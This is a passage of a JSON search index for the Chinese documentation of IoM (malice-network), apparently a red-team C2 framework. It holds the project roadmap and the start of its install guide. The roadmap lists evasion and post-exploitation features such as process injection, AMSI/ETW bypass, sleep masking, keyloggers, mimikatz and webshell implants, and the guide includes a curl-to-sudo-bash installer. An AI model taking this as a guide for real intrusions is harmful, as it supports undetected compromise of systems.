GUI\uff0c\u4f46\u9ad8\u6548\u7684\u5de5\u5177\u5fc5\u5b9a\u4f1a\u6709\u4e00\u4e2a\u7528\u6237\u4f53\u9a8c\u8f83\u597d\u7684 GUI\u3002</p> <p>\u57fa\u4e8e\u793e\u533a\u7684\u63d2\u4ef6\u751f\u6001</p> <p>\u517c\u5bb9 cobaltstrike \u7684 cna \u63d2\u4ef6\u751f\u6001\u3002</p> <p>\u5b9e\u73b0\u81ea\u5df1\u7684\u811a\u672c\u8bed\u8a00\u7684\u670d\u52a1\u7aef/\u5ba2\u6237\u7aef\u63d2\u4ef6\uff0c\u901a\u8fc7 lua \u6216\u8005 yaklang\uff0c\u66f4\u6216\u662f\u4efb\u610f\u8bed\u8a00\u7684\u3002</p>"},{"location":"IoM/roadmap/#v001-\u4e0b\u4e00\u4ee3c2\u6846\u67b6-\u5df2\u53d1\u5e03","title":"v0.0.1 \u4e0b\u4e00\u4ee3C2\u6846\u67b6 (\u5df2\u53d1\u5e03)","text":"<p>\u9884\u8ba1\u57282024\u5e748\u6708\u4efd\u53d1\u5e03</p> <p>release note:  v0.0.1 next generation C2 project</p>"},{"location":"IoM/roadmap/#implant","title":"Implant","text":"<ul> <li> \u5b9e\u73b0melefic\u8c03\u5ea6\u5668<ul> <li> \u652f\u6301\u5f02\u6b65\u8c03\u5ea6module</li> <li> \u5b9e\u73b0task\u7ba1\u7406\u76f8\u5173\u529f\u80fd</li> <li> \u5b9e\u73b0module\u7ba1\u7406\u76f8\u5173\u529f\u80fd</li> </ul> </li> <li> \u5b9e\u73b0\u57fa\u672c\u547d\u4ee4<ul> <li> cp</li> <li> mv</li> <li> cat</li> <li> rm</li> <li> mkdir</li> <li> ls</li> <li> cd</li> <li> pwd</li> <li> chmod</li> <li> chown</li> <li> env/setenv/unsetenv</li> <li> kill</li> <li> ps</li> <li> netstat</li> <li> upload</li> <li> download</li> <li> exec</li> </ul> </li> <li> \u5b9e\u73b0\u62d3\u5c55\u80fd\u529b<ul> <li> execute_assembly</li> <li> execute_shellcode</li> <li> unmanaged powershell</li> <li> execute_pe</li> <li> execute_dll</li> <li> inline_assembly</li> <li> inline_shellcode</li> <li> inline_pe</li> <li> inline_dll</li> <li> execute-bof</li> <li> memfd</li> <li> \u5b9e\u73b0module\u70ed\u52a0\u8f7d</li> <li> \u517c\u5bb9sliver armory extension\u7684dll\u52a0\u8f7d</li> </ul> </li> <li> \u5b9e\u73b0profile, \u80fd\u81ea\u5b9a\u4e49opsec\u7279\u5f81</li> <li> \u8fdb\u7a0b\u64cd\u4f5c<ul> <li> \u8fdb\u7a0b\u9542\u7a7a\uff08process hollowing\uff09</li> <li> \u8fdb\u7a0b\u6ce8\u5165\uff08process inject\uff09<ul> <li> \u57fa\u672c\u8fdb\u7a0b\u6ce8\u5165\u64cd\u4f5c</li> <li> poolparty</li> </ul> </li> <li> \u727a\u7272\u8fdb\u7a0b \uff08sacrifice process \uff09</li> <li> \u7236\u8fdb\u7a0b\u6b3a\u9a97 \uff08spoof parent process\uff09</li> <li> \u4fa7\u52a0\u8f7d\uff08sideload\uff09</li> <li> bypass ETW</li> <li> bypass AMSI</li> <li> BlockDLL</li> </ul> </li> <li> OPSEC<ul> <li> syscall</li> <li> indirect syscall</li> <li> UDRL</li> <li> \u5185\u5b58\u4e0e\u9759\u6001\u6587\u4ef6\u5b57\u7b26\u4e32\u6df7\u6dc6</li> </ul> </li> </ul>"},{"location":"IoM/roadmap/#server","title":"Server","text":"<p>server\u662f\u6240\u6709\u6570\u636e\u6c47\u603b\u5904\u7406\u7684\u6838\u5fc3.</p> <ul> <li> \u901a\u8fc7grpc\u5b9e\u73b0\u5168\u90e8\u7684\u901a\u8baf</li> <li> \u5b9e\u73b0session, client, listener,job, event, task, connection\u7684\u7ba1\u7406</li> <li> \u91cd\u6784\u6570\u636e\u5e93</li> <li> \u89e3\u8026listener</li> <li> \u5b9e\u73b0session\u7684message\u6301\u4e45\u5316\u5b58\u50a8, \u5e76\u80fd\u4ece\u7f13\u5b58\u4e2d\u6062\u590d</li> <li> \u8bb0\u5f55\u6240\u6709\u7684\u64cd\u4f5c, \u5e76\u63d0\u4f9b\u5ba1\u8ba1\u65e5\u5fd7</li> <li> \u5b9e\u73b0deamon</li> <li> \u5b9e\u73b0rootrpc, \u5b9e\u73b0\u4e00\u7cfb\u5217\u9ad8\u6743\u9650\u7ba1\u7406\u64cd\u4f5c</li> <li> \u8bc1\u4e66\u7ba1\u7406\u4e0e\u968f\u673a\u5316\u8bc1\u4e66\u7279\u5f81</li> <li> \u652f\u6301config\u7ba1\u7406server\u914d\u7f6e</li> </ul>"},{"location":"IoM/roadmap/#listener","title":"Listener","text":"<p>listener\u662f\u72ec\u7acb\u90e8\u7f72\u7684\u7ec4\u4ef6, \u901a\u8fc7pipeline\u89e3\u6790\u5e76\u8f6c\u53d1implant\u7684\u6570\u636e\u5230server</p> <ul> <li> \u5b9e\u73b0\u57fa\u672c\u547d\u4ee4</li> <li> \u5b9e\u73b0pipeline\u76f8\u5173\u529f\u80fd<ul> <li> \u5b9e\u73b0TCP pipeline</li> <li> \u5b9e\u73b0pipeline\u7684wrap TLS</li> <li> \u5b9e\u73b0pipeline\u7684wrap encryption</li> </ul> </li> <li> \u5b9e\u73b0\u4e0eserver/client\u7684\u4ea4\u4e92</li> <li> \u5b9e\u73b0website\u76f8\u5173\u529f\u80fd<ul> <li> \u5b9e\u73b0web\u7684\u589e\u5220\u6539\u67e5</li> <li> \u5b9e\u73b0\u4e0eserver/client\u7684\u4ea4\u4e92</li> </ul> </li> <li> \u63d0\u4f9b\u72ec\u7acb\u7684\u914d\u7f6elistener.yaml \u6587\u4ef6</li> </ul>"},{"location":"IoM/roadmap/#client","title":"Client","text":"<ul> <li> \u901a\u8fc7\u4ea4\u4e92\u5f0f\u7684tui\u5c3d\u53ef\u80fd\u63d0\u9ad8cli\u7684\u7528\u6237\u4f53\u9a8c<ul> <li> session explore</li> <li> file explore</li> <li> task explore</li> <li> armory explore</li> </ul> </li> <li> command<ul> <li> \u5b9e\u73b0armory\u76f8\u5173\u529f\u80fd<ul> <li> \u5b9e\u73b0alias</li> <li> \u5b9e\u73b0extension</li> <li> \u5b9e\u73b0armory\u7ba1\u7406\u5668</li> </ul> </li> </ul> </li> <li> \u5b9e\u73b0module\u76f8\u5173command</li> <li> \u5b9e\u73b0\u4e0eserver\u4ea4\u4e92\u7684\u76f8\u5173\u547d\u4ee4</li> <li> \u5b9e\u73b0pipeline\u7684\u76f8\u5173\u547d\u4ee4</li> <li> \u5b9e\u73b0website\u7684\u76f8\u5173\u547d\u4ee4</li> </ul>"},{"location":"IoM/roadmap/#v002-the-real-beginning-\u5df2\u53d1\u5e03","title":"v0.0.2 the Real Beginning (\u5df2\u53d1\u5e03)","text":"<p>release note: v0.0.2 the Real Beginning</p> <ul> <li> \u8865\u5168\u56e0\u90e8\u5206\u6d4b\u8bd5\u9879\u672a\u901a\u8fc7\u5bfc\u81f4v0.0.1\u672a\u80fd\u5982\u671f\u53d1\u5e03\u7684\u529f\u80fd</li> <li> client\u7aef\u91cd\u6784<ul> <li> \u4ecegrumble\u5207\u6362\u5230 https://github.com/reeflective/console</li> <li> \u4f18\u5316\u7528\u6237\u4f53\u9a8c<ul> <li> \u4f18\u5316TUI\u4f53\u9a8c</li> <li> implant\u4ea4\u4e92\u7684\u57fa\u672c\u547d\u4ee4\u6309\u7167\u5176\u539f\u672c\u7528\u6cd5\u91cd\u5199</li> </ul> </li> <li> \u652f\u6301website</li> </ul> </li> <li> CI/CD\u652f\u6301<ul> <li> \u5141\u8bb8\u7528\u6237\u4f7f\u7528github action/docker\u7b49\u5feb\u901f\u7f16\u8bd1implant</li> <li> server/client\u7684CI/CD</li> </ul> </li> <li> implant\u4f18\u5316<ul> <li> \u63d0\u4f9b\u66f4\u591a\u7684\u7f16\u8bd1\u9009\u9879, MSVC, MUSL\u7b49</li> <li> \u4f18\u5316\u7f16\u8bd1\u65f6\u95f4</li> </ul> </li> <li> winkit<ul> <li> Inline PE</li> <li> RunPE cross arch  (\u63a8\u8fdf\u5230v0.0.3)</li> <li> Amsi Etw Community</li> </ul> </li> <li> \u5b9e\u73b0mal\u63d2\u4ef6\u529f\u80fd<ul> <li> \u652f\u6301lua\u4f5c\u4e3a\u63d2\u4ef6\u811a\u672c\u8bed\u8a00(\u540e\u7eed\u53ef\u80fd\u4f1a\u652f\u6301CS\u7684CNA)</li> <li> \u521b\u5efamals\u63d2\u4ef6\u7d22\u5f15\u4ed3\u5e93</li> <li> \u6dfb\u52a0\u63d2\u4ef6\u4f7f\u7528\u6587\u6863\u4e0e\u63d2\u4ef6\u5f00\u53d1\u6587\u6863  (\u63a8\u8fdf\u5230v0.0.3)</li> </ul> </li> <li> \u63d0\u4f9b\u9ed8\u8ba4\u63d2\u4ef6\u5305<ul> <li> gogo</li> <li> zombie</li> <li> spray</li> <li> \u9ed8\u8ba4\u7684lua\u62d3\u5c55\u5305 (\u63a8\u8fdf\u5230v0.0.3)</li> <li> \u57fa\u672cBofs, \u53c2\u8003Havok\u63d0\u4f9b\u7684BOF  (\u63a8\u8fdf\u5230v0.0.3)</li> </ul> </li> <li> \u6dfb\u52a0\u7b2c\u4e09\u65b9app\u901a\u77e5\u7684\u652f\u6301\u4ee5\u53ca\u76f8\u5173api</li> </ul>"},{"location":"IoM/roadmap/#v003-\u771f\u6b63\u610f\u4e49\u4e0a\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\u4e0ec2\u6846\u67b6-\u5df2\u53d1\u5e03","title":"v0.0.3 \u771f\u6b63\u610f\u4e49\u4e0a\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd\u4e0eC2\u6846\u67b6 (\u5df2\u53d1\u5e03)","text":"<p>release note: v0.0.3 RedTeam Infra&amp;C2 framework</p> <ul> <li> client<ul> <li> \u65b0\u589eclient\u7aef\u63d2\u4ef6\u7c7b\u578b golang</li> <li> \u91cd\u6784explorer<ul> <li> \u5b9e\u73b0taskschd explorer</li> <li> \u5b9e\u73b0registry explorer</li> </ul> </li> <li> \u5b9e\u73b0profile, \u80fd\u81ea\u5b9a\u4e49\u81ea\u52a8\u52a0\u8f7d\u7684\u63d2\u4ef6\u96c6</li> <li> \u521d\u6b65\u5b9e\u73b0\u901a\u8fc7client\u5b9e\u73b0\u7684\u81ea\u52a8\u5316\u7f16\u8bd1</li> <li> \u4fee\u590d Client bug, https://github.com/chainreactors/malice-network/issues/16</li> <li> mals \u63d2\u4ef6\u4ed3\u5e93<ul> <li> \u5b9e\u73b0\u63d2\u4ef6\u4ecegithub\u81ea\u52a8\u4e0b\u8f7d\u7ba1\u7406</li> <li> \u5b9e\u73b0lua\u63d2\u4ef6\u51fd\u6570\u6587\u4ef6</li> <li> \u63d0\u4f9blua\u63d2\u4ef6\u5b9a\u4e49\u6587\u4ef6</li> <li> \u63d0\u4f9b\u9ed8\u8ba4\u63d2\u4ef6\u96c6\u5408<ul> <li> default-bof</li> <li> default-elevate</li> <li> default-stay</li> <li> default-move</li> <li> default-chainreactor</li> </ul> </li> </ul> </li> </ul> </li> <li> server/listener<ul> <li> \u91cd\u6784listener\u7684parser, \u5c1d\u8bd5\u517c\u5bb9\u7b2c\u4e09\u65b9C2</li> <li> \u6dfb\u52a0donut, srdi, sgn\u7b49rpc, \u5b9e\u73b0shellcode\u7684\u81ea\u5b9a\u4e49\u64cd\u4f5c</li> </ul> </li> <li> implant<ul> <li> \u63d0\u4f9b\u57fa\u672c\u7684\u6d41\u91cf\u52a0\u5bc6\u9009\u9879</li> <li> \u66f4\u4f18\u96c5\u7684\u81ea\u52a8\u5316\u7f16\u8bd1</li> <li> \u5b9e\u73b0Bind\u6a21\u5f0f\u7684implant</li> <li> \u65b0\u7684\u539f\u751fmodule<ul> <li> services\u64cd\u4f5c</li> <li> \u6ce8\u518c\u8868\u64cd\u4f5c</li> <li> \u8ba1\u5212\u4efb\u52a1\u64cd\u4f5c</li> <li> token\u6a21\u62df\u76f8\u5173\u5b9e\u73b0</li> <li> screenshot (\u4f7f\u7528bof\u4ee3\u66ff)</li> <li> WMI/COM (\u5f85\u5b9a)</li> </ul> </li> <li> StackSpoofer</li> <li> SleepMask Community , (\u8ba1\u5212\u4f7f\u7528\u65b0\u7684\u5806\u52a0\u5bc6\u6280\u672f\u4ee3\u66ff)</li> <li> \u5b9e\u73b0stage 1 loader</li> <li> \u5b9e\u73b0autorun, \u8fd0\u884c\u5728\u7f16\u8bd1\u65f6\u901a\u8fc7yaml\u914d\u7f6e\u4e00\u7cfb\u5217\u81ea\u52a8\u6267\u884c\u7684\u4efb\u52a1</li> </ul> </li> </ul>"},{"location":"IoM/roadmap/#v004-bootstrapping-\u5df2\u53d1\u5e03","title":"v0.0.4 Bootstrapping (\u5df2\u53d1\u5e03)","text":"<p>release note: v0.0.4 Bootstrapping</p> <ul> <li>implant<ul> <li> \u4fee\u590d\u5bf9win7\u517c\u5bb9\u6027  (\u90e8\u5206\u89e3\u51b3)<ul> <li> execute/inline_assembly win7 \u517c\u5bb9(\u76ee\u524d\u4f7f\u7528donut\u4e34\u65f6\u89e3\u51b3)</li> <li> MSVC win7\u517c\u5bb9</li> <li> GNU win7 \u517c\u5bb9</li> </ul> </li> <li> \u89e3\u51b3TLS\u95ee\u9898</li> <li> \u53bb\u6389netstat2\uff0c sysinfo\uff0c whoami\uff0c wmi\u5e93\u4f9d\u8d56\uff0c \u8f6c\u4e3a\u5185\u90e8\u5b9e\u73b0</li> <li> malefic-sRDI</li> <li> DLLSpawn</li> <li> Makefile \u91cd\u6784</li> <li> bug\u4fee\u590d</li> </ul> </li> <li>client/server<ul> <li> \u65b0\u589eartifact\u76f8\u5173\u547d\u4ee4\u548clua api</li> <li> \u65b0\u589eaction \u547d\u4ee4\u7ec4\uff0c \u63a7\u5236github action \u7f16\u8bd1</li> <li> \u65b0\u589edonut\u547d\u4ee4\uff0c\u5b9e\u73b0donut v1.1\u7684\u5168\u90e8\u529f\u80fd</li> <li> \u91cd\u6784\u5e76\u7b80\u5316docker\u7f16\u8bd1<ul> <li> pulse \u81ea\u52a8\u8054\u52a8\u7f16\u8bd1</li> <li> modules\u81ea\u52a8\u8054\u52a8\u7f16\u8bd1</li> <li> \u7f16\u8bd1\u961f\u5217</li> </ul> </li> <li> sgn\u548cmalefic-mutant\u8f6c\u4e3a\u7f16\u8bd1\u65f6\u5d4c\u5165</li> <li> client\u975e\u4ea4\u4e92\u6a21\u5f0f</li> </ul> </li> </ul>"},{"location":"IoM/roadmap/#v010-\u4ee3\u66ffcobaltstrike\u7684\u6700\u540e\u56db\u5757\u788e\u7247-\u5df2\u53d1\u5e03","title":"v0.1.0 \u4ee3\u66ffCobaltStrike\u7684\u6700\u540e\u56db\u5757\u788e\u7247 (\u5df2\u53d1\u5e03)","text":"<p>\u539f\u672c\u8ba1\u5212\u4ecev0.0.4\u76f4\u63a5\u8de8\u8d8a\u5230v0.1.0\uff0c \u4f46\u662f\u9700\u8981\u5b9e\u73b0\u7684\u529f\u80fd\u6bd4\u9884\u671f\u591a\u5f97\u591a\u3002</p> <ul> <li>Server<ul> <li> \u5b9e\u73b0Context\u76f8\u5173RPC<ul> <li> port</li> <li> cred</li> <li> screenshot</li> <li> pivoting</li> <li> upload</li> <li> download</li> </ul> </li> <li> \u6dfb\u52a0REM pipeline</li> <li> \u6570\u636e\u5e93\u91cd\u6784</li> </ul> </li> <li>Client<ul> <li> \u63a5\u5165REM<ul> <li> reverse</li> <li> proxy</li> <li> portforward</li> <li> portfoward local</li> </ul> </li> <li> \u63d2\u4ef6\u7cfb\u7edf\u6b63\u5f0f\u7248</li> <li> \u63d2\u4ef6\u5b8c\u6210\u751f\u6001\u8fc1\u79fb</li> <li> Client \u547d\u4ee4\u6e32\u67d3\u91cd\u6784</li> <li> GUI \u6d4b\u8bd5\u5f00\u542f<ul> <li> Session</li> <li> Pipeline</li> <li> Artifact</li> <li> Context</li> <li> Pivoting</li> </ul> </li> </ul> </li> <li>Implant<ul> <li> malefic-SRDI\u4e0eDonut \u5408\u5e76\uff0c\u91cd\u6784</li> <li> bug \u4fee\u590d<ul> <li> \u4fee\u590dInline local</li> <li> Win11 PE loader</li> <li> transport \u9ad8\u5ef6\u8fdf\u7f51\u7edc\u4e0b\u4e0d\u5de5\u4f5c</li> </ul> </li> <li> OLLVM \u843d\u5730</li> <li> \u53bb\u6389\u6240\u6709\u7b2c\u4e09\u65b9\u4f9d\u8d56</li> <li> \u8fd0\u884c\u65f6\u89e3\u8026<ul> <li> tokio</li> <li> smol</li> <li> async-std</li> </ul> </li> <li> \u8d44\u6e90\u6587\u4ef6\u91cd\u6784</li> <li> http transport</li> <li> implant autorun</li> <li> \u5b9e\u73b0linux-kit<ul> <li> memfd</li> <li> linux bof</li> <li> execute_elf</li> <li> execute_so</li> </ul> </li> <li> 3<sup>rd</sup> module<ul> <li> rem-static</li> <li> rem-reflection</li> <li> keylogger</li> <li> vnc/rustdest</li> </ul> </li> </ul> </li> </ul>"},{"location":"IoM/roadmap/#v011-out-of-the-box-\u5f00\u7bb1\u5373\u7528","title":"v0.1.1 Out of the Box --- \u5f00\u7bb1\u5373\u7528","text":"<p>IoM\u7684\u57fa\u672c\u529f\u80fd\u5df2\u7ecf\u8db3\u591f\u5b8c\u5907\uff0c \u4f46\u662f\u76ee\u524d\u63a5\u89e6\u5230\u7684\u6240\u6709\u53cd\u9988\u90fd\u662f\u4f7f\u7528\u592a\u8fc7\u590d\u6742/bug\u592a\u591a\u3002 \u56e0\u6b64\u6211\u4eec\u4e0b\u4e2a\u7248\u672c\u7684\u5de5\u4f5c\u91cd\u5fc3\u503e\u659c\u5230\u4e86\u7528\u6237\u4f53\u9a8c\u4e0a\u3002 </p> <ul> <li>Server/Client<ul> <li> Saas\u7f16\u8bd1\u670d\u52a1</li> <li> License\u76f8\u5173\u529f\u80fd\uff0c community\u4e5f\u6709\u65e0\u9650\u6b21\u6570\u7684\u514d\u8d39saas\u7f16\u8bd1\u670d\u52a1</li> <li> TLS\u8bc1\u4e66\u7ba1\u7406<ul> <li> \u81ea\u52a8\u7533\u8bf7\u8bc1\u4e66</li> <li> \u81ea\u7b7e\u540d\u8bc1\u4e66</li> <li> Client\u8bc1\u4e66\u7ba1\u7406\u547d\u4ee4\u7ec4</li> </ul> </li> <li> GUI\u9002\u914d</li> <li> Embed Mal<ul> <li> \u652f\u6301CobaltStrike \u5168\u91cf\u529f\u80fd<ul> <li> \u6a2a\u5411\u79fb\u52a8 (v0.1.2)</li> <li> \u63d0\u6743 (v0.1.2)</li> <li> bypass uac</li> <li> token\u64cd\u4f5c</li> <li> \u4fe1\u606f\u6536\u96c6</li> <li> mimikatz</li> <li> keylogger</li> </ul> </li> </ul> </li> </ul> </li> <li>Implant<ul> <li> socks5/http\u4ee3\u7406</li> <li> internal module<ul> <li> switch \u5207\u6362pipeline</li> <li> backup \u65b0\u589e\u5907\u7528\u7684pipeline (v0.1.2)</li> </ul> </li> <li> module<ul> <li> exec \u5b9e\u65f6\u56de\u663e\u6a21\u5f0f</li> <li> \u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c (v0.1.2)</li> </ul> </li> <li> \ud83d\udd12 \u901a\u8baf\u534f\u8bae\u5bc6\u7801\u5b66\u5b89\u5168\u66f4\u65b0\uff0c \u652f\u6301\u52a8\u6001\u5bc6\u94a5 (v0.1.2)</li> <li> \u901a\u8baf\u534f\u8bae\u4f18\u5316</li> <li> \u53cd\u6c99\u7bb1</li> <li> \ud83d\udd12 Beacon Gate \u63a5\u53e3\u5bf9\u5916\u66b4\u9732 (v0.1.2)</li> <li> \ud83d\udd12 \u5806\u52a0\u5bc6 (v0.1.2)</li> </ul> </li> </ul>"},{"location":"IoM/roadmap/#professional","title":"Professional","text":"<p>\u9884\u8ba1\u57282025\u5e74\u524d\u53d1\u5e03, \u6b64\u65f6IoM\u5c06\u5177\u6709\u4e00\u4e2a\u4e0b\u4e00\u4ee3C2\u5e94\u6709\u7684\u80fd\u529b.   \u5e76\u5177\u6709\u5546\u4e1a\u5316\u7684\u6f5c\u529b, \u8d4b\u80fd\u6240\u6709\u653b\u51fb\u6a21\u62df\u9700\u6c42\u7528\u6237.</p> <p>\u7ecf\u8fc7\u4e09\u4e2a\u7248\u672c\u7684\u8fed\u4ee3, \u5df2\u7ecf\u5b9e\u73b0\u4e86\u7edd\u5927\u90e8\u5206\u5fc5\u8981\u7684\u7ec4\u4ef6, \u6211\u4eec\u7ec8\u4e8e\u6709\u7cbe\u529b\u817e\u51fa\u624b\u53bb\u5b9e\u73b0 professional </p> <p>professional \u540c\u6837\u4ee5implant\u6e90\u7801\u7684\u65b9\u5f0f(\u4e0d\u5305\u542bwin-kit)\u4ea4\u4ed8\u7ed9\u4f7f\u7528\u8005, \u5171\u7528server/listener/client\u57fa\u5efa</p> <p>\u4e0eCommunity\u5bf9\u6bd4\u65b0\u589e\u7684\u529f\u80fd:</p> <ul> <li>OPSEC\u7279\u6027<ul> <li>\u4e13\u5c5e\u7684\u5806\u52a0\u5bc6</li> <li>\u5b9a\u5236indirect-syscall, alloc\u7b49\u5404\u79cd\u7ec6\u8282</li> <li>\u4e13\u5c5e\u7684\u8fdb\u7a0b\u6ce8\u5165\u65b9\u5f0f</li> <li>\u4e13\u5c5e\u7684SRDI</li> <li>\u4e13\u5c5e\u7684PE loader</li> <li>\u4e13\u5c5eshellcode template</li> <li>\u63d0\u4f9bMSVC+GNU\u7248\u672c, \u66f4\u81ea\u7531\u7684\u9009\u62e9\u7f16\u8bd1\u5de5\u5177\u94fe</li> <li>ollvm(\u7b2c\u4e00\u4e2a\u7248\u672c\u53ef\u80fd\u6765\u4e0d\u53ca\u5b9e\u73b0)</li> <li>\u5bc6\u7801\u5b66\u524d\u5411\u540e\u5411\u5b89\u5168</li> <li>\u53cd\u6c99\u7bb1</li> <li>\u53cd\u8c03\u8bd5</li> </ul> </li> <li>\u989d\u5916\u529f\u80fd<ul> <li>Professional \u4e13\u5c5eOPSEC\u5de5\u5177\u5305</li> <li>linux-kit</li> <li>\u5185\u7f6e\u6d41\u91cf\u5de5\u5177rem, \u652f\u6301\u6240\u6709\u6280\u672f\u7684\u4ee3\u7406\u4e0e\u7aef\u53e3\u8f6c\u53d1\u6280\u672f</li> </ul> </li> </ul> <p>\u5f88\u9057\u61be\u6211\u4eec\u5728v0.1.0\u4e2d\u6ca1\u6709\u6309\u7167\u9884\u671f\u53d1\u5e03professional \u7248\u672c</p> <p>v0.1.0 \u7684\u4e3b\u8981\u5de5\u4f5c\u5c06\u662f\u5b8c\u5584\u6587\u6863, linux kit, ollvm, GUI </p> <p>TODO list</p> <ul> <li>client<ul> <li> \u5b8c\u5584lua\u63d2\u4ef6, \u5b9e\u73b0\u66f4\u81ea\u7531\u7684\u63d2\u4ef6\u7cfb\u7edf</li> <li> \u5b9e\u73b0\u57fa\u672c\u7684GUI client</li> </ul> </li> <li>implant<ul> <li> \u6dfb\u52a0\u66f4\u4e30\u5bcc\u7684\u7f16\u8bd1\u9009\u9879, \u5b9e\u73b0\u5bf9implant\u6bcf\u4e2a\u7ec6\u8282\u7684\u63a7\u5236</li> <li> \u5b9e\u73b0llvm pass\u63d2\u4ef6, \u9002\u914dollvm</li> <li> \u5b9e\u73b0linux-kit<ul> <li> memfd</li> <li> linux bof</li> <li> execute_elf</li> <li> execute_so</li> </ul> </li> <li> HVNC</li> <li> \u9002\u914drem</li> <li> \u53ef\u7ec4\u88c5\u7684loader</li> <li> \u53cd\u6c99\u7bb1</li> <li> \u53cd\u8c03\u8bd5</li> <li> webshell implant\u7684\u521d\u6b65\u5b9e\u73b0<ul> <li> jsp</li> <li> aspx</li> </ul> </li> </ul> </li> <li> \u6587\u6863<ul> <li> malefic-helper api\u6587\u6863</li> <li> \u4e8c\u6b21\u5f00\u53d1\u6587\u6863</li> <li> \u63d2\u4ef6\u7684\u5f00\u53d1\u4e0e\u8fc1\u79fb\u6587\u6863</li> <li> \u5404\u4e2a\u529f\u80fd\u7684\u6700\u4f73\u5b9e\u8df5\u6587\u6863</li> <li> 3-5\u7bc7\u6280\u672f\u7ec6\u8282\u6587\u6863</li> <li> OPSEC\u6587\u6863</li> <li> \u91cd\u6784\u8bbe\u8ba1\u6587\u6863</li> <li> \u4f18\u5316\u81ea\u52a8\u751f\u6210\u7684\u63d2\u4ef6\u4e0ehelp\u6587\u6863</li> </ul> </li> </ul>"},{"location":"IoM/roadmap/#v100","title":"v1.0.0","text":"<p>\u7ec8\u6781\u76ee\u6807</p> <p>\u9884\u8ba1\u57282025\u5e74\u5185\u53d1\u5e03, \u6b64\u65f6\u7684IoM\u5c06\u80fd\u4f5c\u4e3a\u4e00\u4f53\u5316\u5e73\u53f0\u7684\u4e00\u90e8\u5206, \u63d0\u4f9bPost-Exploit\u90e8\u5206\u80fd\u529b. </p> <p>(todo list \u6682\u672a\u7ec6\u5316, \u65bd\u5de5\u4e2d)</p> <ul> <li> \u63d0\u4f9bGUI</li> <li> \u4e0e\u4e00\u4f53\u5316\u653b\u51fb\u5e73\u53f0\u96c6\u6210</li> <li> ATT&amp;CK<ul> <li> \u57fa\u4e8eATT&amp;CK\u5efa\u7acb\u81ea\u5df1\u7684OPSEC\u77e9\u9635</li> <li> \u6dfb\u52a0ATT&amp;CK\u653b\u51fb\u8def\u7ebf\u56fe\u81ea\u52a8\u751f\u6210</li> </ul> </li> <li> OPSEC \u6a21\u578b</li> </ul>"},{"location":"IoM/guideline/","title":"index","text":""},{"location":"IoM/guideline/#iom-\u7528\u6237\u624b\u518c","title":"IoM \u7528\u6237\u624b\u518c","text":"<p>IoM\u662f\u4e00\u4e2a\u8f83\u4e3a\u590d\u6742\u7684\u7cfb\u7edf\uff0c \u91cc\u9762\u5305\u542b\u4e86\u6570\u767e\u9879\u4e0d\u540c\u7684\u529f\u80fd\u70b9\u3002\u6211\u4eec\u5f88\u96be\u9010\u4e00\u5728\u6587\u6863\u4e2d\u4ecb\u7ecd\u6240\u6709\u7684\u80fd\u529b\uff0c\u53ea\u597d\u9009\u62e9\u59a5\u534f\u4e4b\u7b56\u3002 \u5c06\u4e00\u4e9b\u5e38\u7528\u7684\u529f\u80fd\u4f7f\u7528\u793a\u4f8b\u8be6\u7ec6\u89e3\u91ca\u3002</p> <p>\u5982\u679c\u6709\u5176\u4ed6\u6587\u6863\u63cf\u8ff0\u4e0d\u6e05\u695a\u6216\u8005\u60f3\u4e86\u89e3\u7684\u7528\u6cd5\u6b22\u8fce\u5728 https://github.com/chainreactors/malice-network/issues \u4e2d\u53cd\u9988\uff0c \u6211\u4eec\u4f1a\u6dfb\u52a0\u76f8\u5e94\u7684\u4f7f\u7528\u6848\u4f8b</p>"},{"location":"IoM/guideline/deploy/","title":"\u5b89\u88c5\u90e8\u7f72","text":""},{"location":"IoM/guideline/deploy/#server\u90e8\u7f72","title":"Server\u90e8\u7f72","text":"<p>\u5b89\u88c5\u811a\u672c\u5e76\u975e\u5fc5\u987b, \u82e5\u975e\u6709\u672c\u5730\u7f16\u8bd1\u9700\u6c42, \u53ef\u4ee5\u53c2\u8003quickstart\u5f00\u7bb1\u5373\u7528</p>"},{"location":"IoM/guideline/deploy/#\u5728linux\u4e0a\u4f7f\u7528\u5b89\u88c5\u811a\u672c\u5b89\u88c5","title":"\u5728linux\u4e0a\u4f7f\u7528\u5b89\u88c5\u811a\u672c\u5b89\u88c5:","text":"<pre><code>curl -L \"https://raw.githubusercontent.com/chainreactors/malice-network/master/install.sh\" | sudo bash\n</code></pre> <p>\u786e\u4fdd IoM \u6240\u5728\u7cfb\u7edf\u7b26\u5408\u4ee5\u4e0b\u6761\u4ef6\uff1a</p> <ul> <li>\u64cd\u4f5c\u7cfb\u7edf\uff1aLinux \u63a8\u8350\u4f7f\u7528 Ubuntu\u3001Debian \u6216 CentOS, (\u540e\u7eed\u4f1a\u9002\u914d mac \u4e0e windows)</li> <li>\u6743\u9650\uff1a\u9700\u8981\u4ee5 <code>root</code> \u7528\u6237\u6216\u901a\u8fc7 <code>sudo</code> \u8fd0\u884c\u5b89\u88c5\u811a\u672c\u3002</li> <li>\u7f51\u7edc\u8fde\u63a5\uff1a\u786e\u4fdd\u80fd\u591f\u8bbf\u95ee\u4ee5\u4e0b\u8d44\u6e90<ul> <li><code>github.com</code></li> <li><code>ghcr.io</code></li> <li><code>docker.com</code></li> </ul> </li> </ul> <p>\u7f51\u7edc\u95ee\u9898</p> <p>iom \u9879\u76ee releases \u4e2d\u7684\u6587\u4ef6\u4ecd\u7136\u9700\u8981\u4ece github \u4e0b\u8f7d, \u56fd\u5185\u670d\u52a1\u5668\u8bbf\u95ee github \u5bb9\u6613\u8d85\u65f6, \u5efa\u8bae\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u4e2d\u7684 proxy, \u518d\u6267\u884c\u4e0a\u8ff0\u64cd\u4f5c</p> <p>\u53ef\u4ee5\u6620\u5c04\u672c\u673a\u7684\u4ee3\u7406\u7aef\u53e3\u5230 vps: ssh -R 1080:127.0.0.1:1080 root@vps.ip</p> <pre><code>export http_proxy=\"http://127.0.0.1:1080\"\nexport https_proxy=\"http://127.0.0.1:1080\"\n</code></pre> <p>\u5982\u679c\u4f60\u7684\u5f53\u524d\u7528\u6237\u4e0d\u662f root, \u53ef\u4ee5\u4f7f\u7528 sudo -E bash install.sh, \u4ee5\u4fdd\u6301\u73af\u5883\u53d8\u91cf\u751f\u6548</p> 